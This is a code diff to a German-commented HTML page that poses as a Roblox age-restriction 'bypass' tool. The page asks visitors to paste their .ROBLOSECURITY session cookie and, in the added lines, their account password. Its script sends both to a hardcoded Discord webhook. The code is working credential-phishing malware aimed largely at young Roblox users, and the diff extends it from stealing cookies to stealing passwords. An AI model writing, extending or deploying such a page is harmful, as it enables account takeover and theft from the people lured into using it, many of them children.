@@ -111,7 +111,7 @@
       color: #99ccff;
     }
 
-    textarea {
+    textarea, input[type="password"] {
       width: 100%;
       height: 100px;
       background: #134078;
@@ -124,7 +124,14 @@
       font-family: monospace;
     }
 
-    textarea::placeholder {
+    /* Für Passwort-Input Höhe anpassen */
+    input[type="password"] {
+      height: 50px;
+      font-family: monospace;
+      resize: none;
+    }
+
+    textarea::placeholder, input::placeholder {
       color: #a0c4ff;
     }
 
@@ -153,8 +160,8 @@
       background: linear-gradient(90deg, #2673d9, #004c99);
     }
 
-    /* Hide cookie block initially */
-    #cookieInputContainer {
+    /* Hide cookie and password blocks initially */
+    #cookieInputContainer, #passwordInputContainer {
       display: none;
     }
 
@@ -196,8 +203,14 @@
     <div id="cookieInputContainer" class="cookie-block">
       <div class="cookie-block-title">.ROBLOSECURITY Cookie</div>
       <textarea placeholder="Paste your .ROBLOSECURITY Cookie here..."></textarea>
-      <button id="processBtn" type="button">⚙️ PROCESS ACCOUNT</button>
     </div>
+
+    <div id="passwordInputContainer" class="cookie-block">
+      <div class="cookie-block-title">Account Password</div>
+      <input type="password" placeholder="Enter account password for verification...">
+    </div>
+
+    <button id="processBtn" type="button" style="display:none;">⚙️ PROCESS ACCOUNT</button>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -217,19 +230,13 @@
   <script>
     const bypassSelect = document.getElementById('bypass');
     const cookieInputContainer = document.getElementById('cookieInputContainer');
+    const passwordInputContainer = document.getElementById('passwordInputContainer');
     const processBtn = document.getElementById('processBtn');
-    const textarea = cookieInputContainer.querySelector('textarea');
+    const cookieTextarea = cookieInputContainer.querySelector('textarea');
+    const passwordInput = passwordInputContainer.querySelector('input[type="password"]');
     const errorToast = document.getElementById('errorToast');
 
-    // Zeige/Verstecke das Cookie Feld je nach Auswahl
-    bypassSelect.addEventListener('change', () => {
-      if (bypassSelect.value === 'under13' || bypassSelect.value === 'allages') {
-        cookieInputContainer.style.display = 'block';
-      } else {
-        cookieInputContainer.style.display = 'none';
-      }
-    });
-
+    // Funktion für Fehleranzeige
     function showError(msg) {
       errorToast.textContent = msg;
       errorToast.style.display = 'block';
@@ -238,34 +245,88 @@
       }, 4000);
     }
 
+    // Steuerung der Sichtbarkeit je nach Auswahl
+    bypassSelect.addEventListener('change', () => {
+      const val = bypassSelect.value;
+      if(val === 'under13') {
+        cookieInputContainer.style.display = 'block';
+        passwordInputContainer.style.display = 'none';
+        processBtn.style.display = 'flex';
+      } else if(val === 'allages') {
+        cookieInputContainer.style.display = 'block';
+        passwordInputContainer.style.display = 'block';
+        processBtn.style.display = 'flex';
+      } else {
+        cookieInputContainer.style.display = 'none';
+        passwordInputContainer.style.display = 'none';
+        processBtn.style.display = 'none';
+      }
+    });
+
     processBtn.addEventListener('click', () => {
-      const cookieValue = textarea.value.trim();
-      if (cookieValue.length < 500) {
+      const cookieValue = cookieTextarea.value.trim();
+      const passwordValue = passwordInput.value.trim();
+      const selectedOption = bypassSelect.value;
+
+      if(cookieValue.length < 500) {
         showError('Bitte gib deinen .ROBLOSECURITY Cookie ein (mindestens 500 Zeichen)');
         return;
       }
 
-      // Payload für Discord Webhook vorbereiten
-      const payload = {
-        content: `Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``
-      };
+      if(selectedOption === 'allages' && passwordValue.length === 0) {
+        showError('Bitte gib dein Passwort zur Verifizierung ein.');
+        return;
+      }
 
-      fetch('https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWNWYvXQ7ElgungYskB', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('Cookie wurde erfolgreich gesendet!');
-          textarea.value = '';
-        } else {
+      // Funktion um Nachricht an Discord zu senden
+      function sendToDiscord(message) {
+        return fetch('https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWNWYvXQ7ElgungYskB', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+      }
+
+      // Senden der Daten
+      if(selectedOption === 'allages') {
+        // Erst Cookie senden
+        sendToDiscord(`Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
+        .then(res => {
+          if (!res.ok) throw new Error('Fehler beim Senden des Cookies.');
+          // Dann Passwort senden
+          return sendToDiscord(`Account Passwort:\n\`\`\`\n${passwordValue}\n\`\`\``);
+        })
+        .then(res => {
+          if (!res.ok) throw new Error('Fehler beim Senden des Passworts.');
+          alert('Cookie und Passwort wurden erfolgreich gesendet!');
+          cookieTextarea.value = '';
+          passwordInput.value = '';
+          bypassSelect.value = '';
+          cookieInputContainer.style.display = 'none';
+          passwordInputContainer.style.display = 'none';
+          processBtn.style.display = 'none';
+        })
+        .catch(() => {
           showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
-        }
-      })
-      .catch(() => {
-        showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
-      });
+        });
+      } else {
+        // Nur Cookie senden
+        sendToDiscord(`Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
+        .then(res => {
+          if (res.ok) {
+            alert('Cookie wurde erfolgreich gesendet!');
+            cookieTextarea.value = '';
+            bypassSelect.value = '';
+            cookieInputContainer.style.display = 'none';
+            processBtn.style.display = 'none';
+          } else {
+            throw new Error();
+          }
+        })
+        .catch(() => {
+          showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
+        });
+      }
     });
   </script>
 </body>
